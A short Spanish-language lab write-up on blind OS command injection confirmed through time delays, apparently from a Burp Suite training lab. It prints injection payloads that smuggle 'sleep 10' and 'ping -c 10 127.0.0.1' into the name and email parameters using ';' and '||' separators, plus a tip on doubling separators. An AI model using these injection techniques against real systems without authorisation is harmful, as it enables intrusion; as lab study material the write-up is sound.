# Inyección ciega con retrasos temporales

Tags: #CommandInjection #RCE #BurpSuite 

```bash 
En este lab se aborda una inyección de comandos del sistema operativo en modalidad ciega, usando la función de feedback de la aplicación. Aunque el resultado del comando no se muestra en la respuesta, conseguimos demostrar su ejecución provocando una pausa intencionada.

Al inyectar '||ping -c 10 127.0.0.1||' en el parámetro 'email', el servidor ejecuta el comando y genera un retardo de 10 segundos, lo que confirma la vulnerabilidad.
```

```bash 
❯ name=test ; sleep 10 ; &email=test         # La web tardará  10 segundos en responder 
❯ name=test || ping -c 10 127.0.0.1 || &email=test 


Notas: 
	1. Colocar doble ';' o doble '||' cuando en una inyección de comando secundaria existen más argumentos en la petición 
```